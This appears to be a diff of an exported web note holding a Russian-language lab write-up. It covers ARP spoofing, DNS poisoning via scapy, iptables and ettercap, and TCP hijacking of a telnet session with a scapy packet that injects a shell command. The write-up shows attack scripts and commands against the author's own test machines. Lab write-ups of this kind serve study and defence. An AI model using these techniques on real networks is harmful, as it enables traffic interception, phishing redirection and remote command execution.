@@ -34,15 +34,12 @@
 </head>
 
 <body>
-    <div id="doc" class="markdown-body container-fluid comment-inner comment-enabled" data-hard-breaks="true" style=""><h1 id="ARP-Spoofing" data-id="ARP-Spoofing" style=""><a class="anchor hidden-xs" href="#ARP-Spoofing" title="ARP-Spoofing"><span class="octicon octicon-link"></span></a><span>ARP Spoofing</span></h1><p><img src="https://i.imgur.com/4KEh3L5.png" alt="" loading="lazy"><br>
-<span>Для совершения атаки необходимо:</span><br>
+    <div id="doc" class="markdown-body container-fluid comment-inner comment-enabled" data-hard-breaks="true" style=""><h1 id="ARP-Spoofing" data-id="ARP-Spoofing" style=""><a class="anchor hidden-xs" href="#ARP-Spoofing" title="ARP-Spoofing"><span class="octicon octicon-link"></span></a><span>ARP Spoofing</span></h1><p><img src="https://i.imgur.com/MWOKU0f.png" alt="" loading="lazy"></p><p><span>Для совершения атаки необходимо:</span><br>
 <span>Компьютер злоумышленника, в моей сети это машина Kali Linux в VLAN3;</span><br>
 <span>Компьютер жертвы - Linux Mint в том же VLAN3.</span><br>
 <span>Чтобы траффик проходил через тачку злоумышленника, необходимо маршрутизировать пакеты, для этого на Kali поменяем флаг:</span><br>
 <span>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></p><p><span>Теперь все готово, включаем сеть.</span><br>
-<span>Смотрим айпи адреса, мак адреса устройств Kali и Mint, их arp таблицы:</span><br>
-<img src="https://i.imgur.com/CAHlkK2.png" alt="" loading="lazy"><br>
-<span>Видим, что у жертвы в таблице прописан гитвей(192.168.3.1) и его мак адрес. Нам нужно послать широковещательный ARP запрос, чтобы поменять mac адрес в arp таблицах гитвея и машины жертвы на mac адрес Kali.</span><br>
+<span>Смотрим айпи адреса, мак адреса устройств Kali и Mint, их arp таблицы:</span></p><p><img src="https://i.imgur.com/CAHlkK2.png" alt="" loading="lazy"></p><p><span>Видим, что у жертвы в таблице прописан гитвей(192.168.3.1) и его мак адрес. Нам нужно послать широковещательный ARP запрос, чтобы поменять mac адрес в arp таблицах гитвея и машины жертвы на mac адрес Kali.</span><br>
 <span>Будем использовать написаный мной скрипт на Python:</span></p><pre><code>"""
 My spoofer
 """
@@ -93,8 +90,7 @@ def spoof(victim, router):
 if __name__ == "__main__":
     options = args()
     spoof(options.victim, options.router)
-</code></pre><p><span>После запуска скрипта, снова выводим таблицу у тачки Mint и видим, что мас адреса KAli и роуетра одинаковые</span><br>
-<img src="https://i.imgur.com/pckadLi.png" alt="" loading="lazy"></p><p><span>Дальше уже можно сниффать траффик с машины злоумышленника.</span></p><h2 id="ARP-Spoofing-amp-DNS-Poisoning" data-id="ARP-Spoofing-amp-DNS-Poisoning" style=""><a class="anchor hidden-xs" href="#ARP-Spoofing-amp-DNS-Poisoning" title="ARP-Spoofing-amp-DNS-Poisoning"><span class="octicon octicon-link"></span></a><span>ARP Spoofing &amp; DNS Poisoning</span></h2><p><span>Для этого нам понадобится новый скрипт, который подменяет ответы от DNS сервера,я взял готовый на основе scapy, суть в том, что мы перехватываем траффик с помощью арп спуффера+меняем запросы DNS типа, то есть условно, если жертва отправляет nslookup или ping на </span><a href="http://google.com" target="_blank" rel="noopener"><span>google.com</span></a><span>, то запрос жертву можно будет перенаправить на ip злоумышленника. Это может быть фишинговый сайт.</span><br>
+</code></pre><p><span>После запуска скрипта, снова выводим таблицу у тачки Mint и видим, что мас адреса KAli и роуетра одинаковые</span></p><p><img src="https://i.imgur.com/pckadLi.png" alt="" loading="lazy"></p><p><span>Дальше уже можно сниффать траффик с машины злоумышленника.</span></p><h2 id="ARP-Spoofing-amp-DNS-Poisoning" data-id="ARP-Spoofing-amp-DNS-Poisoning" style=""><a class="anchor hidden-xs" href="#ARP-Spoofing-amp-DNS-Poisoning" title="ARP-Spoofing-amp-DNS-Poisoning"><span class="octicon octicon-link"></span></a><span>ARP Spoofing &amp; DNS Poisoning</span></h2><p><span>Для этого нам понадобится новый скрипт, который подменяет ответы от DNS сервера,я взял готовый на основе scapy, суть в том, что мы перехватываем траффик с помощью арп спуффера+меняем запросы DNS типа, то есть условно, если жертва отправляет nslookup или ping на </span><a href="http://google.com" target="_blank" rel="noopener"><span>google.com</span></a><span>, то запрос жертву можно будет перенаправить на ip злоумышленника. Это может быть фишинговый сайт.</span><br>
 <span>Для этого чтобы перенаправлять нужные пакеты, пропишем нужное правило в файрволл iptables:</span><br>
 <span>iptables -I FORWARD -j NFQUEUE --queue-num 0</span><br>
 <span>Теперь можно обрабатывать DNS пакеты с помощью iptables.</span></p><pre><code>from scapy.all import *
@@ -181,25 +177,20 @@ except KeyboardInterrupt:
 </code></pre><p><span>Для начала используем скрипт для арпспуффинга. Теперь запускаем новый скрипт.</span><br>
 <span>У меня к сожалению не получилось, но мы должны были подменить запрос, тем самым жертва введя в запрос к примеру </span><a href="http://google.com" target="_blank" rel="noopener"><span>google.com</span></a><span> перенаправить на ip, которйы прописал злоумшыленник в скрипте.</span><br>
 <span>Это можно сделать c помощью готовой утилиты на Kali Linux ettercap.</span><br>
-<span>С ettercap все просто, указываем два хоста, жертва и роутер,</span><br>
-<img src="https://i.imgur.com/1GRs9Bu.png" alt="" loading="lazy"><br>
-<span>Задаем в конфиге на какой ip будем менять dns ответ:</span><br>
-<img src="https://i.imgur.com/KcASvGe.png" alt="" loading="lazy"><br>
-<span>После этого подключаем плагин для сниффа и запускаем</span><br>
-<img src="https://i.imgur.com/R7Zbn5d.png" alt="" loading="lazy"><br>
-<span>Жертва пингует домен, ip меняется на мой. Если открыть домен, то открывается сайт злоумышленника.</span><br>
-<img src="https://i.imgur.com/SC3mEZr.png" alt="" loading="lazy"></p><h1 id="TCP-Hijacking" data-id="TCP-Hijacking" style=""><a class="anchor hidden-xs" href="#TCP-Hijacking" title="TCP-Hijacking"><span class="octicon octicon-link"></span></a><span>TCP Hijacking</span></h1><p><span>Начать можно со сниффинга траффика через WireShark с помощью атаки ARP Spoofing.</span><br>
-<span>После этого нам нужно исследовать пакеты при подключении по TCP, например, жертва подключается по telnet на удаленную машину. Последний TCP пакет содержит нужную информацию</span><br>
-<img src="https://i.imgur.com/ZeHJcKL.png" alt="" loading="lazy"><br>
-<span>Порт, ack, seq, и прочее. С помощью скрипта попытался создать папку, но не вышло</span></p><pre><code>from scapy.all import*
-ip = IP(src="192.168.2.2", dst="192.168.3.2")
-tcp = TCP(sport=34688, dport=23, flags="A", seq=2778609551, ack=1591494938)
-data = "\n touch /home/xokage/1.txt\n"
-pkt = ip/tcp/data
+<span>С ettercap все просто, указываем два хоста, жертва и роутер,</span></p><p><img src="https://i.imgur.com/1GRs9Bu.png" alt="" loading="lazy"></p><p><span>Задаем в конфиге на какой ip будем менять dns ответ:</span></p><p><img src="https://i.imgur.com/KcASvGe.png" alt="" loading="lazy"></p><p><span>После этого подключаем плагин для сниффа и запускаем</span></p><p><img src="https://i.imgur.com/R7Zbn5d.png" alt="" loading="lazy"></p><p><span>Жертва пингует домен, ip меняется на мой. Если открыть домен, то открывается сайт злоумышленника.</span></p><p><img src="https://i.imgur.com/SC3mEZr.png" alt="" loading="lazy"></p><h1 id="TCP-Hijacking" data-id="TCP-Hijacking" style=""><a class="anchor hidden-xs" href="#TCP-Hijacking" title="TCP-Hijacking"><span class="octicon octicon-link"></span></a><span>TCP Hijacking</span></h1><p><span>Начать можно со сниффинга траффика через WireShark с помощью атаки ARP Spoofing.</span><br>
+<span>После того, как мы перехватываем пакеты жертвы, на моей схеме это Linux Mint, который подключается к Ubuntu(telnet-server) в другом VLAN. Попробуем перехватить последний TCP пакет, узнать необходимые данные для подделки запроса:</span></p><p><img src="https://i.imgur.com/RkG3Ieb.png" alt="" loading="lazy"></p><p><span>С помощью кода:</span></p><pre><code>from scapy.all import*
+
+IPLayer = IP(src="192.168.3.3", dst="192.168.2.2")
+TCPLayer = TCP(sport=33752, dport=23, flags="A", seq=1960141434, ack=748143598)
+
+data = "\n touch /home/osboxes/you_hacked.txt \n"
+pkt = IPLayer/TCPLayer/data
 ls(pkt)
-send(pkt, verbose=0)
-</code></pre><p><span>Почему то не получается…</span><br>
-<span>Но суть атаки в том, что мы можем снифая траффик, получить необходимые флаги, тем самым подключиться в tcp сессию.</span></p></div>
+send(pkt, verbose =0)
+
+</code></pre><p><span>Попробуем создать файлик на сервере.</span><br>
+<span>Результат:</span><br>
+<span>На машине ubuntu(telnet server) появился файл</span></p><p><img src="https://i.imgur.com/A5OQCHL.png" alt="" loading="lazy"></p><p><span>Также можно прокинуть reverse shell, сделать RCE.</span></p></div>
     <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
         <div class="pull-right dropdown">
             <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
